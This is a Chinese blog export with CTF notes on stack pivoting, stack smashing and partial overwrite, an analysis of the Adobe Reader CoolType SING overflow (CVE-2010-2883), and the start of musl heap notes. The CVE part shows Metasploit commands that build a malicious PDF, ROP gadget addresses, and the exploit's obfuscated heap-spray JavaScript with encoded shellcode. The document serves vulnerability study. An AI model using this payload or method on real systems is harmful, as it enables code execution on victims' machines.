<p>先在合适的地方将我们构造的rop chain或shellcode，再利用栈溢出将<strong>指令的首地址+8</strong>的指针写入栈帧部分，再将保存有<code>leave;ret</code>指令的地址写入return address。那么加上原本程序中的<code>leave;ret</code>，我们将执行两次。执行了两次后将sp迁移到了指定地址，最后<code>ret</code>会接着执行攻击者设计的执行流程。</p>
<p>根据下图加深印象：</p>
<p><img src="https://s2.loli.net/2022/03/04/FftxCI8Ey3KrHpb.png" alt="5"></p>
<p>需要注意的是，当我们将栈帧迁移之后，我们写入的执行指令可能是执行另一个函数，那么就会在当前这个位置开栈。如果我们开栈的位置距离一些写有重要数据的段不远，那么函数执行时将会覆盖掉一些，可能会令程序执行不下去导致dump。</p>
<h4 id="特殊的利用方法"><a href="#特殊的利用方法" class="headerlink" title="特殊的利用方法"></a>特殊的利用方法</h4><p>这是通过一道栈迁移题目新学到的。题中有一行代码是这样写的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.text:00000000004011CB                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000004011CF                 mov     edx, 40h ; &#x27;@&#x27;  ; nbytes</span><br><span class="line">.text:00000000004011D4                 mov     rsi, rax        ; buf</span><br><span class="line">.text:00000000004011D7                 mov     edi, 0          ; fd</span><br><span class="line">.text:00000000004011DC                 mov     eax, 0</span><br><span class="line">.text:00000000004011E1                 call    _read</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>我们知道变量的地址是通过变量到栈帧的偏移计算得到的。于是我们可以通过改变<code>rbp</code>的值来利用read函数对任意地址进行改写，甚至在bss段写入一段ropchain，最后执行，如果ropchain过长，可以在bss段上反复横跳来写入。</p>
<h3 id="stack-smash"><a href="#stack-smash" class="headerlink" title="stack smash"></a>stack smash</h3><p>我们知道如果程序开启了canary保护后，我们进行栈溢出操作就会报错。stack smash就是利用改写报错内容来打印出敏感内容。</p>
<p>原理：开启了canary保护后，若发现canary被修改，程序就会执行<code>__stack_chk_fail</code>函数来打印argv[0]指针所指向的字符串，正常情况下，这个指针指向的是程序名。所以当我们利用栈溢出漏洞将argv[0]地址的内容改写为敏感信息的地址，那么就能泄露。</p>
<h3 id="栈上的-partial-overwrite"><a href="#栈上的-partial-overwrite" class="headerlink" title="栈上的 partial overwrite"></a>栈上的 partial overwrite</h3><p>内容主要是：仅改变这个地址的部分内容，一般为低位。</p>
<p>程序即使开了地址随机化保护，它的主要表现都集中在高位地址的变化，而低12位地址一般是偏移，是不会变化的，这也是我们利用低12位地址就能泄露libc版本原因。因此，我们仅需改写地址的低12位地址的偏移就能绕过PIE保护。</p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>初次尝试，CVE-2020-2883复现与分析</title>
    <url>/2022/04/27/%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95%EF%BC%8CCVE-2020-2883%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>个人复现的第一个漏洞，从《漏洞战争》一书和别人的复现分析中学到了许多。</p>
<span id="more"></span>

<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2010-2883">官方文档</a></p>
<blockquote>
<p>Stack-based buffer overflow in CoolType.dll in Adobe Reader and Acrobat 9.x before 9.4, and 8.x before 8.2.5 on Windows and Mac OS X, allows remote attackers to execute arbitrary code or cause a denial of service (application crash) via a PDF document with a long field in a Smart INdependent Glyphlets (SING) table in a TTF font, as exploited in the wild in September 2010. NOTE: some of these details are obtained from third party information.<br>References</p>
</blockquote>
<p>该漏洞是 Adobe Reader 和 Acrobat 的 CoolType.dll 库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞。</p>
<h2 id="msf复现"><a href="#msf复现" class="headerlink" title="msf复现"></a>msf复现</h2><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">虚拟机</td>
<td align="left">VMWare</td>
</tr>
<tr>
<td align="left">攻击机环境</td>
<td align="left">kali linux</td>
</tr>
<tr>
<td align="left">靶机环境</td>
<td align="left">Windows XP SP3</td>
</tr>
</tbody></table>
<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><h4 id="搜索模块"><a href="#搜索模块" class="headerlink" title="搜索模块"></a>搜索模块</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search cve-2010-2883</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                            Disclosure Date  Rank   Check  Description</span><br><span class="line">   -  ----                                            ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/browser/adobe_cooltype_sing     2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">   1  exploit/windows/fileformat/adobe_cooltype_sing  2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br></pre></td></tr></table></figure>

<p>结果有两个，一个是基于浏览器的，一个是基于软件的，我们选择基于软件的，也就是第二个。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br></pre></td></tr></table></figure>

<h4 id="设置payload"><a href="#设置payload" class="headerlink" title="设置payload"></a>设置payload</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set payload windows/exec </span><br><span class="line">payload =&gt; windows/exec</span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set CMD calc.exe</span><br><span class="line">CMD =&gt; calc.exe</span><br></pre></td></tr></table></figure>

<p>让我们最后能弹出计算器</p>
<h4 id="设置并生成PDF"><a href="#设置并生成PDF" class="headerlink" title="设置并生成PDF"></a>设置并生成PDF</h4><figure class="highlight plaintext"><figcaption><span>exploit(windows/fileformat/adobe_cooltype_sing) > set FILENAME test.pdf</span></figcaption><table><tr><td class="code"><pre><span class="line">FILENAME =&gt; test.pdf                                                                                                                                                                                                                         </span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; exploit                                                                                                                                                                               </span><br><span class="line">                                                                                                                                                                                                                                             </span><br><span class="line">[*] Creating &#x27;test.pdf&#x27; file...                                                                                                                                                                                                              </span><br><span class="line">[+] test.pdf stored at /home/rabbit/.msf4/local/test.pdf</span><br></pre></td></tr></table></figure>

<p>然后我们将该文件放入靶机并打开</p>
<p><img src="https://s2.loli.net/2022/04/26/jR6UBirCG47VnXf.png" alt="结果"></p>
<p>成功打开了计算器</p>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h3><table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">操作系统</td>
<td align="left">Windows XP SP3</td>
</tr>
<tr>
<td align="left">虚拟机</td>
<td align="left">VMWare</td>
</tr>
<tr>
<td align="left">调试软件</td>
<td align="left">OllyDbg</td>
</tr>
<tr>
<td align="left">反汇编软件</td>
<td align="left">IDA</td>
</tr>
<tr>
<td align="left">漏洞软件</td>
<td align="left">Adobe Reader 9.3.4</td>
</tr>
</tbody></table>
<h3 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h3><h4 id="strcat-函数"><a href="#strcat-函数" class="headerlink" title="strcat 函数"></a>strcat 函数</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strcat</span><span class="params">(<span class="keyword">char</span> *dest, <span class="keyword">const</span> <span class="keyword">char</span> *src)</span></span>;</span><br></pre></td></tr></table></figure>

<p>strcat 会将参数 src 字符串复制拼接到参数 dest 所指的字符串尾部，与 strcpy 一样是常见的造成栈溢出漏洞产生的危险函数。</p>
<h3 id="基于字符串定位漏洞"><a href="#基于字符串定位漏洞" class="headerlink" title="基于字符串定位漏洞"></a>基于字符串定位漏洞</h3><p>使用IDA反汇编 CoolType.dll 库，搜索文本 SING (ALT+T)查看，因为该字符串是漏洞解析出错的地方</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.rdata:0819DB4C ; const char aSing[]</span><br><span class="line">.rdata:0819DB4C aSing           db &#x27;SING&#x27;,0             ; DATA XREF: sub_8015AD9+D2↑o</span><br><span class="line">.rdata:0819DB4C                                         ; sub_803DCF9+7B↑o ...</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>找到后再单击 x 查看引用。</p>
<p><img src="https://s2.loli.net/2022/04/26/GZrcHXYC94pn5ES.png" alt="查看引用"></p>
<p>根据《软件战争 软件漏洞分析技术揭秘》书中内容，我们逐个排查比对找到对应代码与危险函数strcat。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79                 push    edi             ; int</span><br><span class="line">.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DD7D                 call    sub_8021B06</span><br><span class="line">.text:0803DD82                 mov     eax, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DD85                 cmp     eax, esi</span><br><span class="line">.text:0803DD85 ;   &#125; // starts at 803DD53</span><br><span class="line">.text:0803DD87 ;   try &#123;</span><br><span class="line">.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B                 jz      short loc_803DDC4</span><br><span class="line">.text:0803DD8D                 mov     ecx, [eax]</span><br><span class="line">.text:0803DD8F                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DD95                 jz      short loc_803DD9F</span><br><span class="line">.text:0803DD97                 cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D                 jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9C↑j</span><br><span class="line">.text:0803DD9F                 add     eax, 10h</span><br><span class="line">.text:0803DDA2                 push    eax             ; Source</span><br><span class="line">.text:0803DDA3                 lea     eax, [ebp+108h+Destination]</span><br><span class="line">.text:0803DDA6                 push    eax             ; Destination</span><br><span class="line">.text:0803DDA7                 mov     [ebp+108h+Destination], 0</span><br><span class="line">.text:0803DDAB                 call    strcat</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<h3 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h3><p>我们将该段给反汇编为伪源代码并截取其中关键部分来分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">int</span> v18; <span class="comment">// [esp+44h] [ebp-24h] BYREF</span></span><br><span class="line">……</span><br><span class="line"><span class="keyword">if</span> ( v18 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int16)*(_DWORD *)v18 || (<span class="keyword">unsigned</span> __int16)*(_DWORD *)v18 == <span class="number">256</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          Destination[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">strcat</span>(Destination, (<span class="keyword">const</span> <span class="keyword">char</span> *)(v18 + <span class="number">0x10</span>));    <span class="comment">//v18指向SING表，0x10为uniqueName相较于SING表的偏移</span></span><br><span class="line">          sub_8001243(Destination);</span><br><span class="line">          v6 = v18;</span><br><span class="line">        &#125;</span><br><span class="line">        v21 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>很明显，调用 strcat 时并没有对长度进行限制，造成栈溢出。</p>
<h4 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h4><p>我们直接对msf生成的PDF进行分析即可。<a href="http://www.rabb1t.xyz/2022/04/26/PDF%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/">PDF文件结构</a></p>
<p>使用PdfStreamDumper得到PDF样本中的TTF文件中关于SING表的TableEntry结构数据。</p>
<blockquote>
<p><code>.TTF</code>为后缀的文件被叫做字体文件，其实是一张表，其中包含所有的字体(或合成规则)，</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/04/26/71AKGL84ulnSDFO.png" alt="TTF Font"></p>
<p><img src="https://s2.loli.net/2022/04/26/h5REaAt4j68WxKu.png" alt="find"></p>
<p><img src="https://s2.loli.net/2022/04/26/cxIYeOrilbDSuws.png" alt="SING"></p>
<p>而官方文档给出的对TableEntry结构的定义为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> struct_SING</span><br><span class="line">&#123;                   <span class="comment">//SING表对应的TableEntry结构</span></span><br><span class="line">  <span class="keyword">char</span> tag[<span class="number">4</span>];      <span class="comment">//标记             &quot;SING&quot;</span></span><br><span class="line">  ULONG checkSun;   <span class="comment">//校验和          0xd9bcc8b5</span></span><br><span class="line">  ULONG offset;     <span class="comment">//相对文件的偏移  0x0000011c</span></span><br><span class="line">  ULONG length;     <span class="comment">//数据长度       0x00001ddf</span></span><br><span class="line">&#125; TableEntry;</span><br></pre></td></tr></table></figure>

<p>依据偏移找到SING表(起始为 0x00000100)</p>
<p><img src="https://s2.loli.net/2022/04/26/c86qBn4t3MzmLX5.png" alt="SING"></p>
<p>接着再偏移0x10，即为uniqueName域(即输入内容的起始为<code>3A B4 18 E5</code>)。执行 strcat 后，会将该部分复制到ebp的指定地址，接下来我们进行动态调试。</p>
<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>一个小技巧，msf生成pdf前，将文件<code>/usr/share/metasploit-framework/modules/exploits/windows/fileformat/adobe_cooltype_sing.rb</code>，中的第102行注释掉，换成第101行的内容。这可以将exp中的填充字符从随机字符变为’A’。</p>
<p>利用OD调试 Adobe Reader，在刚才找到的引用 SING 表处下断点(F2)，单过执行至 0x803DD85，查看此时寄存器的内容：</p>
<p><img src="https://s2.loli.net/2022/04/26/mwEt91LshxBvcfd.png" alt="register"></p>
<p>此时 EAX 内的内容为 0x48663b4，我们跳转过去看其中内容：</p>
<p><img src="https://s2.loli.net/2022/04/26/ovZ9V2ganjpsG4I.png" alt="OD"></p>
<p>与我们PDF文件中 uniqueName 域中内容对应，这就是程序加载文件内容的地方。待会调用 strcat 时，就会将这块的内容拼接到 Destination 指向的地址。</p>
<p>单过执行至调用 strcat 处(0x803DDAB)，调用 strcat 后查看 Destination 指向的值：</p>
<p><img src="https://s2.loli.net/2022/04/26/sie84KuTDRSX5mM.png" alt="OD"></p>
<p>其中内容已经变为了 uniqueName 域的内容</p>
<p>经过调试，一直跟进到 0x0808B308 再单过就会调出计算器，其内容为 <code>CALL DWORD PTR DS:[EAX]</code>，这就是执行我们ROP指令的地址。然后此时 eax 的值为 0x4A80CB38，查看其中内容：</p>
<p><img src="https://s2.loli.net/2022/04/27/OojmHELgnzUPKIy.png" alt="leave_ret"></p>
<p>其实就是平时栈迁移题里常用的<code>leave_ret</code>指令。此时的 ebp 值为 0x012E4DC，在栈上是</p>
<p><img src="https://s2.loli.net/2022/04/27/AburZOBkgEzmqMh.png" alt="stack"></p>
<p>也就是我们插入的第一个ret地址，我们在这里看看执行时具体会产生什么效果。</p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ul>
<li>首先将栈上的 0x0C0C0C0C 内容赋给ESP，其中内容为 0x4A8063A5，然后ret。执行 0x4A8063A5</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/RDP6C3dcY7UKbfJ.png" alt=" 0x4A8063A5"></p>
<ul>
<li>接着弹出栈上内容赋给 ECX，内容为 0x4A8A0000，然后ret，执行 0x4A802196</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/Lgmnr4psR5IXfbk.png" alt="0x4A802196"></p>
<ul>
<li>将EAX的值赋给[ECX]，此时EAX为 0x0012E6D0，然后ret，执行 0x4A801F90</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/SdPwzRHmsVL4fIT.png" alt="OD"></p>
<p><img src="https://s2.loli.net/2022/04/27/85gaciZpGyKlDhM.png" alt="0x4A801F90"></p>
<ul>
<li>弹出栈上元素赋给EAX，即 0x4A801F90，然后ret，执行 0x4A80B692</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/tIn9CTAVpF6JR5Z.png" alt="0x4A80B692"></p>
<ul>
<li>而 0x4A801F90 连接了一个函数<code>CreateFileA</code>，</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/BXYdQyw39GVaN8u.png" alt="CreateFileA"></p>
<ul>
<li>调用 CreateFileA，创建了一个名为 iso88591 的文件，然后ret</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/VU265KIHGtcJvSR.png" alt="OD"></p>
<p>接着调试发现是一样的过程，只不过调用的函数不同。程序接着调用了 CreateFileMappingA，创建文件内存映射</p>
<p><img src="https://s2.loli.net/2022/04/27/bpfTIHMnAgrSsBk.png" alt="CreateFileMappingA"></p>
<p>还有 MapViewOfFile，将shellcode复制到申请的内存处</p>
<p><img src="https://s2.loli.net/2022/04/27/79QuAEmBDsWrTc5.png" alt="MapViewOfFile"></p>
<p>shellcode 是通过嵌入PDF的JavaScript来写入的，内容可以在 PdfStreamDumper 中看到：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> SRrMvMAOXcbsiGKZawqPShWHOEnYUhlMdTQEhPNhZpeaKOjnYCrGkeTCftz = <span class="built_in">unescape</span>;</span><br><span class="line"><span class="keyword">var</span> gpEWSNKZtZtrDtXDBlCGqjwdCCvqvwmQdNdYQREWutshKgfOzkONtk = SRrMvMAOXcbsiGKZawqPShWHOEnYUhlMdTQEhPNhZpeaKOjnYCrGkeTCftz( <span class="string">&#x27;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u80b8%uaf28%udbe6%ud9d1%u2474%u5bf4%uc933%u31b1%u4331%u0313%u1343%uc383%uca84%u1a5a%u886c%ue3a5%ued6c%u062c%u2d5d%u424a%u9dcd%u0618%u56e1%ub34c%u1a72%ub459%u9133%ufbbf%u8ac4%u9afc%ud146%u7cd0%u1a77%u7c25%u47b0%u2cc4%u0369%uc17b%u591e%u6a40%u4f6c%u8fc0%u6e24%u01e1%u293f%ua321%u41ec%ubb68%u6cf1%u3022%u1bc1%u90b5%ue318%udd1a%u1695%u1962%uc911%u5311%u7462%ua022%ua219%u33a7%u21b9%u981f%ue538%u6bc6%u4236%u348c%u555a%u4f41%ude66%u8064%ua4ef%u0442%u7fb4%u1dea%ud110%u7d13%u8efb%uf5b1%uda11%u57cb%u1d7f%ue259%u1dcd%ued61%u7661%u6650%u01ee%uad6d%ufd4b%uec27%u96fd%u64e1%ufabc%u5311%u0282%u5692%uf17a%u128a%ubd7f%uce0c%uae0d%uf0f8%ucfa2%u9328%u5c25%u7ab0%ue4c0%u8353&#x27;</span> );</span><br><span class="line"><span class="keyword">var</span> ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl = SRrMvMAOXcbsiGKZawqPShWHOEnYUhlMdTQEhPNhZpeaKOjnYCrGkeTCftz( <span class="string">&quot;%&quot;</span> + <span class="string">&quot;u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> );</span><br><span class="line"><span class="keyword">while</span> (ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl+=ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl;</span><br><span class="line">xhqRDDrTFaPkhbN = ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span>-<span class="number">0x24</span>)/<span class="number">2</span>);</span><br><span class="line">xhqRDDrTFaPkhbN += gpEWSNKZtZtrDtXDBlCGqjwdCCvqvwmQdNdYQREWutshKgfOzkONtk;</span><br><span class="line">xhqRDDrTFaPkhbN += ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl;</span><br><span class="line">VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG = xhqRDDrTFaPkhbN.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG.length &lt; <span class="number">0x80000</span>) VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG += VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG;</span><br><span class="line">mLVmRyYrugLJciVQSgzSkPkUFzjzDOKYXQkoytvknMtSifxjImzmzSTeiCuEQPphAUUaPPwqzvKauVkNtTGlsHqWo = VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span>-<span class="number">0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> TTVHhqJwkQBQtxBZnehysrCfheMgKLPScAahDQdBupbGZfetgTbtisRexcMEZXwfwmcwgapnfnVxiGFHJwuwBYqddyfeF = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (BtzHVK=<span class="number">0</span>;BtzHVK&lt;<span class="number">0x1f0</span>;BtzHVK++) TTVHhqJwkQBQtxBZnehysrCfheMgKLPScAahDQdBupbGZfetgTbtisRexcMEZXwfwmcwgapnfnVxiGFHJwuwBYqddyfeF[BtzHVK]=mLVmRyYrugLJciVQSgzSkPkUFzjzDOKYXQkoytvknMtSifxjImzmzSTeiCuEQPphAUUaPPwqzvKauVkNtTGlsHqWo+<span class="string">&quot;s&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>最后调用计算器</p>
<p><img src="https://s2.loli.net/2022/04/27/Bv6CuDKlznyjEqs.png" alt="WinExec"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>主要是构造了ROPchain。</p>
<p>使用到的Gadget主要有：</p>
<ul>
<li>0x4A82A714 &gt; <code>pop esp;ret</code></li>
<li>0x4A8063A5 &gt; <code>pop ecx;ret</code></li>
<li>0x4A802196 &gt; <code>mov dword ptr ds:[ecx],eax;ret</code></li>
<li>0x4A80CB38 &gt; <code>add ebp,794;leave;ret</code></li>
<li>0x4A801F90 &gt; <code>pop eax;ret</code></li>
<li>0x4A80B692 &gt; <code>jmp dword ptr ds:[eax]</code></li>
<li>0x4A842DB2 &gt; <code>xchg eax,edi;ret</code></li>
<li>0x4A801064 &gt; <code>ret</code></li>
<li>……</li>
</ul>
<p>再来看EXP可以很明显的看见其中的gadget</p>
<p><img src="https://s2.loli.net/2022/04/27/WhjETCo8p4i3NtB.png" alt="EXP"></p>
<p>利用这些gadget和嵌入文件的JS代码，将shellcode写入文件的可执行段(绕过DEP)，也就是我们调用 CreateFile 等函数的所申请的内存空间，最后执行。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.joe1sn.top/2020/10/06/%E5%88%9D%E5%AD%A6CVE-2010-2883%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E5%8F%8A%E5%A4%8D%E7%8E%B0/">初学CVE-2010-2883漏洞调试及复现</a></p>
<p><a href="https://www.anquanke.com/post/id/179681">细说CVE-2010-2883从原理分析到样本构造 </a></p>
<p>《软件战争 软件漏洞分析技术揭秘》 2.3 CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞</p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>CVE</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>musl初识</title>
    <url>/2022/08/25/musl%E5%88%9D%E8%AF%86/</url>
    <content><![CDATA[<p>musl 库中关于堆的一些基本知识</p>
<span id="more"></span>

<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">	<span class="keyword">size_t</span> psize, csize;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> lock[<span class="number">2</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>chunk：</p>
<ul>
<li>psize：prev_size</li>
<li>csize：chunk_size</li>
<li>*next：fd</li>
<li>*prev：bk</li>
</ul>
<p>已分配的 chunk 之间是相互连续的，可以通过 psize 与 csize 访问;当 chunk 空闲时，是通过 next 与 prev 相连的。<br>当 flag==1 时，表示该chunk为小chunk，释放时放入bin; falg==0 时，表示该chunk为大chunk，释放时调用munmap。</p>
<p>bin：</p>
<ul>
<li>lock[2]：用于锁</li>
<li>*head：指向第一个 chunk 的 mem</li>
<li>*tail：指向最后一个 chunk 的 mem</li>
</ul>
<p>bin 是一个管理空闲 chunk 的链式结构，当 bin 中空闲时，head 和 tail 都指向 bin 本身。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">uint64_t</span> binmap;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> split_merge_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure>

<ul>
<li>binmap：位图，每位对应一个bin</li>
<li>bins[64]：bin数组，固定64个bin，表示可以有64个空闲chunk链表</li>
<li>free_lock[2]：用于锁</li>
</ul>
<p>musl 中的分配区，与 ptmalloc 中的 arena 不同的是，并没有对 bins 有除了大小外的区分。</p>
<h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>大致流程：</p>
<ol>
<li>检查申请大小<ul>
<li>n&lt;0:返回0</li>
<li>n&gt;MMAP_THRESHOLD:调用 mmap 直接分配</li>
</ul>
</li>
<li>获取 n 对应的 bin_idx，若该 idx 对应的 bin 不为空，则取出 chunk。</li>
